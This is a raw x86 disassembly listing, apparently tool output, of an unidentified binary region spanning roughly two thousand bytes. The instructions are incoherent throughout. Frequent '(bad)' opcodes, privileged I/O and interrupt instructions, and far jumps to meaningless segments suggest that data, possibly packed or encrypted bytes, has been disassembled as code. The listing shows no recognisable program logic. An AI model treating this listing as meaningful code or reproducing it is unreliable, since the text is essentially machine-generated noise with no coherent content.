  414d96:	das    
  414d97:	fnsave [ecx-0x1b060079]
  414d9d:	mov    dl,0x3a
  414d9f:	mov    ebx,0xcefd7f05
  414da4:	das    
  414da5:	stos   DWORD PTR es:[edi],eax
  414da6:	xchg   esi,eax
  414da7:	push   0x4d849604
  414dac:	mov    eax,ds:0x3287ecc7
  414db1:	xchg   edi,eax
  414db2:	retf   0x4a6a
  414db5:	inc    esi
  414db6:	lods   eax,DWORD PTR ds:[esi]
  414db7:	std    
  414db8:	push   esi
  414db9:	jp     0x414d6a
  414dbb:	mov    ebp,0xd13ef542
  414dc0:	push   ebp
  414dc1:	push   ebx
  414dc2:	sub    al,BYTE PTR [ebx-0xf]
  414dc5:	sub    al,0x2e
  414dc7:	aad    0x4d
  414dc9:	xchg   DWORD PTR [edi],ecx
  414dcb:	neg    BYTE PTR [edx+0x3c4b139]
  414dd1:	and    DWORD PTR [ebp+0x4fb0c304],ebx
  414dd7:	loop   0x414e43
  414dd9:	call   0x35e8:0x99a9b0ba
  414de0:	and    DWORD PTR [ebp-0x52],edx
  414de3:	cmp    eax,DWORD PTR [esi]
  414de5:	mov    ebp,0x361df5b9
  414dea:	inc    esp
  414deb:	scas   al,BYTE PTR es:[edi]
  414dec:	into   
  414ded:	imul   ebp,DWORD PTR [eax],0xba8e939c
  414df3:	xchg   bh,al
  414df5:	pushf  
  414df6:	jne    0x414dbb
  414df8:	push   edx
  414df9:	(bad)  
  414dfb:	jle    0x414e4e
  414dfd:	imul   eax,DWORD PTR [eax-0x6dd4a4be],0xffffffa8
  414e04:	inc    ebp
  414e05:	outs   dx,DWORD PTR ds:[esi]
  414e06:	(bad)  
  414e07:	or     al,0x5b
  414e09:	pusha  
  414e0a:	sub    ebp,ebx
  414e0c:	nop
  414e0d:	xchg   esi,eax
  414e0e:	and    edi,DWORD PTR [edi+0x24a19868]
  414e14:	(bad)  
  414e15:	outs   dx,BYTE PTR ds:[esi]
  414e16:	ret    
  414e17:	add    DWORD PTR [edi-0x60],edi
  414e1a:	xor    BYTE PTR [ebp-0x47ec7c2f],0xfc
  414e21:	mov    edx,0xb69e6955
  414e26:	mov    dl,0x36
  414e28:	test   eax,0xe256d78c
  414e2d:	push   es
  414e2e:	sub    al,0xdf
  414e30:	fist   WORD PTR [eax-0x3b]
  414e33:	push   edx
  414e34:	test   BYTE PTR [esi+0x2eaee65d],ah
  414e3a:	fmul   st,st(6)
  414e3c:	push   0xf9e6e9e8
  414e41:	xor    esp,0x8afb91e2
  414e47:	out    dx,eax
  414e48:	pop    es
  414e49:	jg     0x414e98
  414e4b:	in     eax,dx
  414e4c:	pop    edx
  414e4d:	and    dl,BYTE PTR [ecx-0x3]
  414e50:	dec    esi
  414e51:	dec    esi
  414e52:	or     esp,DWORD PTR [edi-0x74]
  414e55:	dec    eax
  414e56:	loope  0x414de7
  414e58:	push   ecx
  414e59:	in     eax,0x83
  414e5b:	stos   BYTE PTR es:[edi],al
  414e5c:	stos   BYTE PTR es:[edi],al
  414e5d:	ss push cs
  414e5f:	pop    edi
  414e60:	and    BYTE PTR [edx-0x9],0xc3
  414e64:	sbb    BYTE PTR [edi+ecx*4+0x1e48bbd3],ah
  414e6b:	sub    al,0xe4
  414e6d:	adc    DWORD PTR [edi-0x38],ecx
  414e70:	jne    0x414e80
  414e72:	das    
  414e73:	mov    al,0x3f
  414e75:	jne    0x414ead
  414e77:	xchg   DWORD PTR [ebx],esi
  414e79:	(bad)  
  414e7a:	pop    edi
  414e7b:	push   ebx
  414e7c:	sbb    eax,0x1fa559fe
  414e81:	test   dl,dl
  414e83:	push   cs
  414e84:	pop    ecx
  414e85:	jo     0x414e74
  414e87:	call   0x78f0fdeb
  414e8c:	dec    eax
  414e8d:	mov    esp,0xc87036fb
  414e92:	inc    edx
  414e93:	xchg   ebp,eax
  414e94:	xchg   edx,eax
  414e95:	push   DWORD PTR [esp+edx*1-0x1bc41c24]
  414e9c:	pop    ebp
  414e9d:	jbe    0x414e61
  414e9f:	dec    eax
  414ea0:	sub    DWORD PTR [edi],0xf2de32e0
  414ea6:	push   ecx
  414ea7:	cmc    
  414ea8:	adc    esi,edi
  414eaa:	popa   
  414eab:	xlat   BYTE PTR ds:[ebx]
  414eac:	and    edx,eax
  414eae:	mov    dl,0x6d
  414eb0:	push   edx
  414eb1:	ss scas al,BYTE PTR es:[edi]
  414eb3:	mov    eax,ds:0x37fb0738
  414eb8:	cmp    ecx,DWORD PTR [esi]
  414eba:	test   eax,0x24563111
  414ebf:	cmc    
  414ec0:	mov    ebp,0xb9a8d2d0
  414ec5:	cmp    eax,0x18ef26de
  414eca:	leave  
  414ecb:	push   es
  414ecc:	push   esi
  414ecd:	ja     0x414edc
  414ecf:	or     eax,0x86626266
  414ed4:	and    BYTE PTR [esi+0x33],bl
  414ed7:	cmp    ah,BYTE PTR [eax+0x6c70bc46]
  414edd:	in     al,dx
  414ede:	jp     0x414ed5
  414ee0:	scas   eax,DWORD PTR es:[edi]
  414ee1:	xchg   ecx,eax
  414ee2:	add    edi,ecx
  414ee4:	jp     0x414ed8
  414ee6:	rol    BYTE PTR [esi-0x62d4a650],0x4f
  414eed:	push   ebx
  414eee:	sti    
  414eef:	(bad)  
  414ef0:	stos   BYTE PTR es:[edi],al
  414ef1:	xchg   BYTE PTR [esi+0x1c],bh
  414ef4:	test   al,0xa
  414ef7:	jnp    0x414e8b
  414ef9:	pop    ebx
  414efa:	push   esp
  414efb:	mov    dh,bh
  414efd:	cmc    
  414efe:	and    eax,0x6726c4f8
  414f03:	inc    edx
  414f04:	rol    ecx,cl
  414f06:	mov    cl,0x16
  414f08:	(bad)  
  414f09:	lods   eax,DWORD PTR ds:[esi]
  414f0a:	inc    ecx
  414f0b:	sub    al,0x2f
  414f0d:	shr    BYTE PTR [eax+eax*4],0x67
  414f11:	div    edx
  414f13:	mov    BYTE PTR [esi+0x54],al
  414f16:	jmp    0x414ea7
  414f18:	pop    ebp
  414f19:	fmul   QWORD PTR [eax]
  414f1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f1c:	and    DWORD PTR [ecx],edx
  414f1e:	xchg   ecx,eax
  414f1f:	xchg   ebx,eax
  414f20:	cmp    ebx,ebp
  414f22:	js     0x414f11
  414f24:	xor    eax,0x26c6893a
  414f29:	sbb    BYTE PTR [ecx+edx*2],0x71
  414f2d:	mov    bh,0x92
  414f2f:	test   al,0x6b
  414f31:	lock int 0x3
  414f34:	test   DWORD PTR [edi],eax
  414f36:	mov    edi,0x5aa6a89b
  414f3b:	ins    DWORD PTR es:[edi],dx
  414f3c:	cmp    esi,eax
  414f3e:	gs (bad) 
  414f40:	xchg   ebx,eax
  414f41:	call   0x4cf0:0x7df9e902
  414f48:	fild   DWORD PTR [ebx]
  414f4a:	clc    
  414f4b:	jl     0x414f1b
  414f4d:	ins    BYTE PTR es:[edi],dx
  414f4e:	ins    BYTE PTR es:[edi],dx
  414f4f:	inc    edx
  414f50:	in     eax,0xb6
  414f52:	pop    ds
  414f53:	in     eax,0xe2
  414f55:	cli    
  414f56:	xchg   esp,eax
  414f57:	cmp    ecx,DWORD PTR ds:0xad20a086
  414f5d:	xor    cl,BYTE PTR [edx+0x46]
  414f60:	and    ecx,esp
  414f62:	int3   
  414f63:	push   ebp
  414f64:	jo     0x414f88
  414f66:	inc    esi
  414f67:	arpl   WORD PTR [eax],dx
  414f69:	fist   DWORD PTR [edi-0x4b1d770a]
  414f6f:	test   eax,eax
  414f71:	(bad)  
  414f73:	jne    0x414f7f
  414f75:	pop    edi
  414f76:	cmp    eax,0x1b40fc04
  414f7b:	lods   eax,DWORD PTR ds:[esi]
  414f7c:	inc    ebp
  414f7d:	adc    ebp,esi
  414f7f:	mov    WORD PTR [eax],ss
  414f81:	inc    ebp
  414f82:	add    DWORD PTR [ebx+0x2d64e9b7],0x7fb8610a
  414f8c:	sbb    al,0x9b
  414f8e:	div    dl
  414f90:	lahf   
  414f91:	test   BYTE PTR [edx],0xe1
  414f94:	popa   
  414f95:	sub    ebx,DWORD PTR [eax]
  414f97:	jge    0x414f56
  414f99:	mov    al,0xb9
  414f9b:	icebp  
  414f9c:	push   0xffffff85
  414f9e:	ret    
  414f9f:	pop    ebx
  414fa0:	into   
  414fa1:	std    
  414fa2:	ins    BYTE PTR es:[edi],dx
  414fa3:	dec    esi
  414fa4:	cmp    eax,0x2b1c04cc
  414fa9:	fwait
  414faa:	mov    eax,ds:0x10f264e2
  414faf:	mov    BYTE PTR [ebp*1-0x31facd20],bl
  414fb6:	outs   dx,BYTE PTR ds:[esi]
  414fb7:	repnz and DWORD PTR [eax+0xf],esi
  414fbb:	in     al,dx
  414fbc:	sub    al,0x3e
  414fbe:	loopne 0x414f4b
  414fc0:	pop    esi
  414fc1:	xchg   ebp,eax
  414fc2:	stos   BYTE PTR es:[edi],al
  414fc3:	or     eax,0xdb1a550b
  414fc8:	jmp    0x5371:0x256e78d2
  414fcf:	fild   WORD PTR [ebx-0x7f]
  414fd2:	outs   dx,BYTE PTR ds:[esi]
  414fd3:	add    DWORD PTR [esi],eax
  414fd5:	and    BYTE PTR [ebp+0x7a],al
  414fd8:	repnz cmp BYTE PTR [ebx],0xc5
  414fdc:	(bad)  
  414fde:	adc    eax,0x3a87c171
  414fe3:	lock aas 
  414fe5:	mov    esp,0x8e2fdb14
  414fea:	call   0xcbef1e92
  414fef:	idiv   DWORD PTR [ebx]
  414ff1:	shr    DWORD PTR [ebp+0x41a6cbb],1
  414ff7:	pop    esp
  414ff8:	data16 jns 0x41502a
  414ffb:	push   edx
  414ffc:	fsub   st(2),st
  414ffe:	jns    0x414f9d
  415000:	ja     0x414fda
  415002:	stos   DWORD PTR es:[edi],eax
  415003:	popa   
  415004:	fucomp st(6)
  415006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415007:	mov    DWORD PTR [eax],esp
  415009:	push   ds
  41500a:	loop   0x414ff0
  41500c:	mov    ebx,DWORD PTR [edx]
  41500e:	sbb    BYTE PTR [edx],dh
  415010:	mov    esp,0x436a174a
  415015:	mov    ebx,0xac20f5f5
  41501a:	cld    
  41501b:	jmp    0xfa4a:0xbf202be6
  415022:	push   ecx
  415023:	hlt    
  415024:	retf   
  415025:	adc    dl,al
  415027:	xchg   esp,eax
  415028:	add    al,0xe3
  41502a:	nop
  41502b:	fwait
  41502c:	(bad)  
  41502d:	call   0xccf8e73b
  415032:	cmp    ah,BYTE PTR [ecx]
  415034:	addr16 push ebp
  415036:	stos   DWORD PTR es:[edi],eax
  415037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415038:	or     eax,0xe110e1b4
  41503d:	xchg   ebx,eax
  41503e:	sbb    DWORD PTR [ebp+edx*1-0x33],esi
  415042:	shl    dl,cl
  415044:	pop    ecx
  415045:	xchg   esp,eax
  415046:	loopne 0x41500c
  415048:	mov    bl,0x3a
  41504a:	frstor [ebx+0x32]
  41504d:	or     BYTE PTR [esp+eax*1+0xf44b9bf],dh
  415054:	add    edi,DWORD PTR [edi+0x77e9d17b]
  41505a:	mov    bl,0xe4
  41505c:	enter  0x53f,0x3a
  415060:	mov    es,WORD PTR [ebp+0x2f99b7e8]
  415066:	sar    ebx,1
  415068:	int3   
  415069:	jecxz  0x4150c5
  41506b:	(bad)  
  41506c:	cmp    eax,0x539060a7
  415071:	fimul  WORD PTR [ebx+0x5a3cd5d]
  415077:	fild   WORD PTR [edx+ebp*2]
  41507a:	js     0x4150b3
  41507c:	test   eax,0x6b3040a8
  415081:	adc    DWORD PTR [ebx],esi
  415083:	dec    edx
  415084:	and    DWORD PTR [ecx+0x73d43e47],eax
  41508a:	or     ebx,edx
  41508c:	jno    0x415093
  41508e:	loop   0x415017
  415090:	rol    ah,cl
  415092:	(bad)  
  415094:	sbb    eax,0xc411ed18
  415099:	das    
  41509a:	dec    esi
  41509b:	call   FWORD PTR [edx+0xd0e6daa]
  4150a1:	push   eax
  4150a2:	jno    0x41510a
  4150a4:	outs   dx,DWORD PTR ds:[esi]
  4150a5:	mov    eax,0x5dd3d5b4
  4150aa:	mov    ds:0x2ed130a6,eax
  4150af:	add    ebp,DWORD PTR [eax+0x7af34381]
  4150b5:	and    eax,0x14870534
  4150ba:	ins    BYTE PTR es:[edi],dx
  4150bb:	adc    DWORD PTR [edi-0x44],ebp
  4150be:	xor    dl,BYTE PTR [edx]
  4150c0:	jo     0x4150f9
  4150c2:	pop    ss
  4150c3:	inc    esi
  4150c4:	les    ebp,FWORD PTR [eax-0x394808a3]
  4150ca:	jae    0x41508e
  4150cc:	hlt    
  4150cd:	xchg   edi,eax
  4150ce:	repz mul DWORD PTR [edi+0x3d]
  4150d2:	jae    0x41505a
  4150d4:	ds mov ebx,0xd38dfa9f
  4150da:	into   
  4150db:	dec    edx
  4150dc:	in     al,0x35
  4150de:	xor    DWORD PTR [ebx+0x3b],ecx
  4150e1:	sbb    eax,0x536885a7
  4150e6:	(bad)  
  4150e7:	(bad)  
  4150e8:	dec    eax
  4150e9:	jbe    0x415142
  4150eb:	sbb    cl,BYTE PTR [ebx+0xa0a7f17]
  4150f1:	xor    BYTE PTR [ebx],dl
  4150f3:	out    0x1f,eax
  4150f5:	push   0x69bbc3a1
  4150fa:	mov    ds,WORD PTR [eax-0x7e]
  4150fd:	fldenv [eax-0x7c3d8331]
  415103:	pop    ebx
  415104:	push   ebp
  415105:	inc    esi
  415106:	fadd   DWORD PTR [ebx-0x12eb38bc]
  41510c:	pop    ds
  41510d:	pop    edi
  41510e:	pop    ebx
  41510f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415110:	repnz ror DWORD PTR [ebp+ebx*4-0x4f],0x4c
  415116:	shr    DWORD PTR ds:0x8c051dd4,1
  41511c:	repz sub al,0xc4
  41511f:	jmp    0x7a06:0xe1223b47
  415126:	cwde   
  415127:	loope  0x4150ae
  415129:	lahf   
  41512a:	jne    0x4150d3
  41512c:	xchg   ebx,eax
  41512d:	repz xchg esi,eax
  41512f:	scas   al,BYTE PTR es:[edi]
  415130:	pop    es
  415131:	push   edi
  415132:	xchg   edi,eax
  415133:	mov    dl,0x30
  415135:	pop    esi
  415136:	aad    0x55
  415138:	call   FWORD PTR [ecx-0x25]
  41513b:	and    eax,0x91fa4e94
  415140:	xchg   edx,eax
  415141:	dec    edx
  415142:	aam    0x80
  415144:	xlat   BYTE PTR ds:[ebx]
  415145:	scas   eax,DWORD PTR es:[edi]
  415146:	mov    ah,0x6b
  415148:	xor    DWORD PTR [esi+edx*1+0x73b738a0],esp
  41514f:	repz iret 
  415151:	retf   0x3a30
  415154:	mov    edi,0x94e1cbc4
  415159:	and    al,0xb8
  41515b:	std    
  41515c:	mov    edi,0xa436c419
  415161:	lock add eax,0x8e79e140
  415167:	add    al,0x20
  415169:	adc    BYTE PTR [ebx+0x6d],0x47
  41516d:	and    al,0xb7
  41516f:	cli    
  415170:	ret    
  415171:	and    dl,ah
  415173:	push   edx
  415174:	jno    0x41514a
  415176:	mov    esp,0xd5db6746
  41517b:	outs   dx,BYTE PTR ds:[esi]
  41517c:	loope  0x4151d5
  41517e:	sbb    eax,0xfd0d9ecc
  415183:	jne    0x41516d
  415185:	imul   esp,DWORD PTR [edi+0x6dabf53a],0x86ad7b2b
  41518f:	mov    edx,0x8342c002
  415194:	mov    BYTE PTR [ecx-0x697c9bb6],0x28
  41519b:	jle    0x41517c
  41519d:	or     ah,BYTE PTR [ebx-0x554e0313]
  4151a3:	test   esi,esp
  4151a5:	fmulp  st(1),st
  4151a7:	inc    ebp
  4151a8:	push   edx
  4151a9:	les    edi,FWORD PTR [ecx+ebx*4-0x10e1f05c]
  4151b0:	mov    dh,0xe3
  4151b2:	(bad)  
  4151b3:	mov    bh,0x9a
  4151b5:	das    
  4151b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151b7:	inc    esp
  4151b8:	hlt    
  4151b9:	xchg   edx,eax
  4151ba:	pop    edx
  4151bb:	popf   
  4151bc:	push   ecx
  4151bd:	icebp  
  4151be:	test   DWORD PTR [ecx+0x41],ebp
  4151c1:	fstp   DWORD PTR [ecx+0x9]
  4151c4:	xor    DWORD PTR [edi],eax
  4151c6:	ins    DWORD PTR es:[edi],dx
  4151c7:	or     esi,ebx
  4151c9:	mov    esi,DWORD PTR [edi]
  4151cb:	push   eax
  4151cc:	push   esi
  4151cd:	fist   DWORD PTR [esi-0x1a]
  4151d0:	xchg   esi,eax
  4151d1:	fcmovnb st,st(0)
  4151d3:	test   DWORD PTR [ebp-0x65],eax
  4151d6:	movups xmm2,XMMWORD PTR [edi]
  4151d9:	xchg   ebx,eax
  4151da:	repnz (bad) 
  4151dc:	pop    eax
  4151dd:	leave  
  4151de:	(bad)  
  4151df:	mov    esi,0x158b2faa
  4151e4:	fwait
  4151e5:	enter  0xe1ca,0xd
  4151e9:	cmp    al,0x80
  4151eb:	cld    
  4151ec:	sub    DWORD PTR [ecx+0x2b9d9d05],edx
  4151f2:	outs   dx,DWORD PTR ds:[esi]
  4151f3:	push   ebp
  4151f4:	icebp  
  4151f5:	add    DWORD PTR [eax],ebx
  4151f7:	(bad)  
  4151f8:	push   eax
  4151f9:	adc    al,0x1a
  4151fb:	pop    ebp
  4151fc:	or     ebx,DWORD PTR [edx+0x44]
  4151ff:	shr    DWORD PTR [eax],0xdb
  415202:	add    DWORD PTR [ebx],ecx
  415204:	cmp    BYTE PTR [eax-0x37178b87],0xb4
  41520b:	popf   
  41520c:	imul   esi,DWORD PTR [esi+0x15],0xa9dc990e
  415213:	bound  esp,QWORD PTR [ebx*8+0x3e6d5f73]
  41521a:	pop    esi
  41521b:	inc    ecx
  41521c:	es je  0x4151fe
  41521f:	mov    eax,DWORD PTR [esi-0x4a]
  415222:	imul   ecx,DWORD PTR ds:[edi+0x20],0x39487713
  41522a:	or     cl,BYTE PTR [ecx]
  41522c:	scas   al,BYTE PTR es:[edi]
  41522d:	loop   0x415212
  41522f:	(bad)
  415233:	call   0xe5a410f6
  415238:	sbb    edi,esp
  41523a:	sbb    ebx,ecx
  41523c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41523d:	test   BYTE PTR [esi-0x7e],bl
  415240:	(bad)  
  415241:	pop    edi
  415242:	(bad)  
  415243:	or     ecx,DWORD PTR [ecx]
  415245:	loopne 0x415224
  415247:	sub    eax,0x1fb537c6
  41524c:	or     bl,BYTE PTR [esi+ebx*2-0x6a9c4d7e]
  415253:	pusha  
  415254:	stos   BYTE PTR es:[edi],al
  415255:	mov    bl,bh
  415257:	or     eax,0x25ba5e37
  41525c:	stos   BYTE PTR es:[edi],al
  41525d:	cs pop esp
  41525f:	inc    esp
  415260:	ss imul bh
  415263:	inc    esi
  415264:	jl     0x4152b2
  415266:	jnp    0x4151ea
  415268:	xor    al,0x6a
  41526a:	adc    eax,esi
  41526c:	jbe    0x4152c1
  41526e:	pop    es
  41526f:	mov    bl,0xf0
  415271:	mov    edi,0x74d1bda9
  415276:	xchg   edi,eax
  415277:	push   ds
  415278:	cmp    al,0x9
  41527a:	dec    ebp
  41527b:	aad    0xce
  41527d:	jmp    0x4152fe
  41527f:	cmp    esi,DWORD PTR ds:0xc84e9e8c
  415285:	inc    edx
  415286:	mov    ds,WORD PTR [edi+0x4edd99a6]
  41528c:	sbb    eax,DWORD PTR [eax-0x2b86d964]
  415292:	mov    ch,0x87
  415294:	add    al,0x15
  415296:	and    dh,dl
  415298:	mov    bh,0xa3
  41529a:	out    dx,al
  41529b:	cmc    
  41529c:	(bad)  
  41529f:	in     al,0xd7
  4152a1:	and    cl,BYTE PTR [esi]
  4152a3:	retf   0x8562
  4152a6:	and    ecx,ebx
  4152a8:	test   BYTE PTR [ecx+0x68],cl
  4152ab:	call   0x226d9414
  4152b0:	stos   DWORD PTR es:[edi],eax
  4152b1:	sahf   
  4152b2:	push   edx
  4152b3:	cld    
  4152b4:	rcr    DWORD PTR [edi-0x64],cl
  4152b7:	add    ebp,DWORD PTR [eax-0x634c8aab]
  4152bd:	mov    al,ds:0x1b7cde53
  4152c2:	dec    esi
  4152c3:	mov    esp,0xe087f1fb
  4152c8:	stos   DWORD PTR es:[edi],eax
  4152c9:	out    0x8f,eax
  4152cb:	inc    ebp
  4152cc:	push   cs
  4152cd:	mov    BYTE PTR [esi-0x79ba2255],ch
  4152d3:	mov    cl,0xeb
  4152d5:	test   DWORD PTR [eax+0x55],eax
  4152d8:	xchg   esi,eax
  4152d9:	sbb    edx,ebp
  4152db:	(bad)  
  4152dc:	sahf   
  4152dd:	cmp    al,cl
  4152df:	sbb    al,0x9a
  4152e1:	mov    dl,0x14
  4152e3:	lock inc ecx
  4152e5:	sar    DWORD PTR [ebx+edx*1-0x1],1
  4152e9:	out    0x11,al
  4152eb:	fldcw  WORD PTR [esi+0x44]
  4152ee:	aad    0xd3
  4152f0:	inc    ecx
  4152f1:	pop    edx
  4152f2:	bound  edi,QWORD PTR [ecx+0x77]
  4152f5:	push   ds
  4152f6:	sahf   
  4152f7:	xchg   edx,eax
  4152f8:	xchg   ecx,eax
  4152fa:	call   0xe9ae:0xf389d049
  415301:	(bad)  
  415302:	arpl   WORD PTR [edx-0x5afbe6ac],cx
  415308:	dec    esp
  415309:	adc    BYTE PTR [eax-0x33ddf165],cl
  41530f:	mov    bh,0xf
  415311:	pop    esp
  415312:	shl    BYTE PTR [edx],1
  415314:	dec    ebx
  415315:	mov    ch,0x7b
  415317:	pop    edi
  415318:	sbb    al,0xb2
  41531a:	scas   al,BYTE PTR es:[edi]
  41531b:	lods   eax,DWORD PTR ds:[esi]
  41531c:	lea    eax,[edx]
  41531e:	aas    
  41531f:	pop    es
  415320:	mov    ah,0x39
  415322:	cmp    DWORD PTR [esi-0x5f5caf35],0x73ebf841
  41532c:	mov    DWORD PTR [ebp+0x56],edx
  41532f:	inc    ebx
  415330:	ins    DWORD PTR es:[edi],dx
  415331:	int    0x71
  415333:	fdivr  DWORD PTR [eax+0x2]
  415336:	rcl    DWORD PTR [edx+ecx*8-0x769355f4],1
  41533d:	jle    0x41530d
  41533f:	mov    edx,0x9a0578b8
  415344:	mov    ds:0xc145f763,al
  415349:	cmc    
  41534a:	fild   WORD PTR [eax+0x19]
  41534d:	sub    bl,cl
  41534f:	cmp    BYTE PTR [eax+ecx*4],0xa4
  415353:	ret    0x450e
  415356:	mov    bh,0x6c
  415358:	xchg   BYTE PTR ds:0xac8fc90c,cl
  41535e:	or     ch,ah
  415360:	fmul   QWORD PTR [edi]
  415362:	ret    
  415363:	cmp    DWORD PTR [ecx-0x11c74be7],edx
  415369:	aam    0x8
  41536b:	(bad)  
  41536c:	mov    edi,0xc7d8e936
  415371:	test   eax,0x353a8f5f
  415376:	add    al,0x4e
  415378:	ja     0x41535e
  41537a:	jno    0x415364
  41537c:	sub    DWORD PTR [eax-0x2aaa779a],ebp
  415382:	cs pop edi
  415384:	or     eax,0x41e8213d
  415389:	in     eax,0x23
  41538b:	jbe    0x4153c3
  41538d:	(bad)  
  41538e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41538f:	dec    ebp
  415390:	mov    ebx,0x96c3c0e9
  415395:	cdq    
  415396:	jae    0x415338
  415398:	push   cs
  415399:	sahf   
  41539a:	xor    esp,DWORD PTR [edx-0x50e0983d]
  4153a0:	xor    BYTE PTR [esi],cl
  4153a2:	ror    DWORD PTR [eax-0x61d4a6d5],0x6a
  4153a9:	lods   al,BYTE PTR ds:[esi]
  4153aa:	lds    ebx,FWORD PTR [ecx+0x14]
  4153ad:	shl    ch,1
  4153af:	cmp    edx,ecx
  4153b1:	std    
  4153b2:	cmp    al,0xca
  4153b4:	xchg   edi,eax
  4153b5:	pop    edx
  4153b6:	in     eax,dx
  4153b7:	add    ecx,DWORD PTR [ebp+eiz*1+0x40]
  4153bb:	cmp    eax,0x4c536e7b
  4153c0:	fs in  al,0x24
  4153c3:	push   cs
  4153c4:	sbb    eax,DWORD PTR [edi+0x25]
  4153c7:	mov    ebp,0x8c35578e
  4153cc:	test   eax,0x512a647e
  4153d1:	or     al,0x78
  4153d3:	sbb    BYTE PTR [ebx-0x10],0xf8
  4153d7:	cdq    
  4153d8:	or     eax,0x61c4ceca
  4153dd:	mov    ebp,0xef4f0158
  4153e2:	or     ebx,DWORD PTR [eax+0x75]
  4153e5:	dec    ecx
  4153e6:	mov    ebx,0x2bc2c825
  4153eb:	pop    ebp
  4153ec:	sub    bh,dl
  4153ee:	mov    ch,0xdb
  4153f0:	adc    ch,ch
  4153f2:	iret   
  4153f3:	adc    ch,BYTE PTR [edx-0xf]
  4153f6:	dec    edx
  4153f7:	and    DWORD PTR [edx+esi*8],ebp
  4153fa:	mov    bh,0x96
  4153fc:	adc    dh,BYTE PTR [esi+0x23]
  4153ff:	ds test eax,0xf75245e1
  415405:	add    BYTE PTR [ebp+0x352725d0],dh
  41540b:	jmp    0xe77d:0xecacd177
  415412:	or     eax,DWORD PTR [ebx+0x6d]
  415415:	jno    0x41547a
  415417:	xchg   esp,eax
  415418:	retf   
  415419:	fld    QWORD PTR [edi-0x49]
  41541c:	test   DWORD PTR [ecx-0x1b4253de],esi
  415422:	ficom  WORD PTR [ebp+ebx*8-0x6c]
  415426:	cmc    
  415427:	pop    ebx
  415428:	inc    eax
  41542a:	or     al,0x78
  41542c:	inc    esi
  41542d:	push   edi
  41542e:	pop    edx
  41542f:	and    al,0xef
  415431:	mov    ah,BYTE PTR [edi-0x5f]
  415434:	mov    DWORD PTR ds:0x74ceb769,0x51bd1fec
  41543e:	sub    dl,BYTE PTR gs:[esi-0x65]
  415442:	or     DWORD PTR [ebx-0x7e],0x6f
  415446:	inc    ecx
  415447:	retf   0xe0ef
  41544a:	or     edi,DWORD PTR [ecx+0x29706a04]
  415450:	sbb    DWORD PTR [ecx+0x226cbd05],ebp
  415456:	sub    eax,0x81168252
  41545b:	fistp  DWORD PTR [edx]
  41545d:	add    BYTE PTR [edi],ch
  41545f:	pop    edx
  415460:	bound  ebx,QWORD PTR [eax]
  415462:	jp     0x415427
  415464:	in     eax,dx
  415465:	fwait
  415466:	pop    es
  415467:	xor    DWORD PTR [edx-0x65],esi
  41546a:	pop    esp
  41546b:	xchg   esp,eax
  41546c:	aaa    
  41546d:	and    ecx,DWORD PTR [edx+0x5fbc8c7e]
  415473:	std    
  415474:	iret   
  415475:	push   ds
  415476:	and    edx,DWORD PTR ds:0xf0b2de61
  41547c:	in     al,dx
  41547d:	bound  ecx,QWORD PTR [ecx+ebx*4-0x23858c9b]
  415484:	popf   
  415485:	mov    esp,0x3d1d26b0
  41548a:	mov    esp,0xaf2b3554
  41548f:	ja     0x41550e
  415491:	jle    0x4154ed
  415493:	bound  ebp,QWORD PTR [edx+0x6a]
  415496:	and    BYTE PTR [ebx-0x37],dh
  415499:	daa    
  41549a:	sub    al,0xc1
  41549c:	dec    ecx
  41549d:	push   esi
  41549e:	sahf   
  41549f:	xchg   esp,eax
  4154a0:	and    BYTE PTR [ecx+eiz*2+0x2f],0x21
  4154a5:	mov    edx,db7
  4154a8:	in     eax,dx
  4154a9:	clc    
  4154aa:	push   esi
  4154ab:	inc    esp
  4154ac:	arpl   WORD PTR [edx+0x51],sp
  4154af:	enter  0x91b0,0x92
  4154b3:	or     al,0x65
  4154b5:	fnstsw WORD PTR [ebx+0x1e]
  4154b8:	push   cs
  4154b9:	ret    0xce6b
  4154bc:	xor    DWORD PTR [ecx+0x45],0xe4506af5
  4154c3:	sub    cl,BYTE PTR [eax]
  4154c5:	sub    eax,0x6d0bf3aa
  4154ca:	ins    BYTE PTR es:[di],dx
  4154cc:	int    0x5c
  4154ce:	sbb    al,0x4b
  4154d0:	jne    0x4154ad
  4154d2:	jnp    0x415541
  4154d4:	lea    ebp,[ebx+0x3da2c39c]
  4154da:	adc    eax,0xd9066258
  4154df:	into   
  4154e0:	push   esi
  4154e1:	push   0x7e65383c
  4154e6:	ds mov fs,ecx
  4154e9:	lods   al,BYTE PTR ds:[esi]
  4154ea:	fbld   TBYTE PTR [ebp+0x6e1144e4]
  4154f0:	pop    ss
  4154f1:	pop    es
  4154f2:	outs   dx,BYTE PTR ds:[esi]
  4154f3:	repnz cdq 
  4154f5:	repz pop ds
  4154f7:	sub    BYTE PTR [ecx+esi*1+0x59d4bcb8],bh
  4154fe:	sbb    ecx,esp
  415500:	and    eax,0xbe9d7fcf
  415505:	icebp  
  415506:	test   DWORD PTR [eax-0x6e],ebx
  415509:	sub    BYTE PTR [eax+0x26],ch
  41550c:	leave  
  41550d:	nop
  41550e:	ret    
  41550f:	sub    al,0xb0
  415511:	test   DWORD PTR [edi],esi
  415513:	ror    BYTE PTR [di-0x705a],1
  415518:	sbb    BYTE PTR [ecx+0x7a],ah
  41551b:	mov    ah,0x26
  41551d:	dec    ebp
  41551e:	ret    0xaa39
  415521:	jo     0x4154fb
  415523:	loop   0x415531
  415525:	and    ebx,ebx
  415527:	inc    ecx
  415528:	xor    ch,bl
  41552a:	jno    0x415541
  41552c:	jne    0x415562
  41552e:	in     eax,dx
  41552f:	mov    DWORD PTR [ebx-0x726a09b9],ebp
  415535:	in     al,0x7f
  415537:	iret   
  415538:	push   ds
  415539:	gs out 0xea,eax
  41553c:	in     al,0xaa
  41553e:	or     BYTE PTR [ecx+0x59],al
  415541:	pushf  
  415542:	inc    edi
  415543:	iret   
  415544:	neg    BYTE PTR [ebx-0x54a6ae4]
  41554a:	mov    al,0xa7
  41554c:	dec    ebx
  41554d:	cld    
  41554e:	outs   dx,BYTE PTR ds:[esi]
  41554f:	mov    DWORD PTR [ebp-0xf],ecx
  415552:	or     al,0x3f
  415554:	lock dec esi
  415556:	jmp    0x48b5f717
  41555b:	in     eax,0x2b
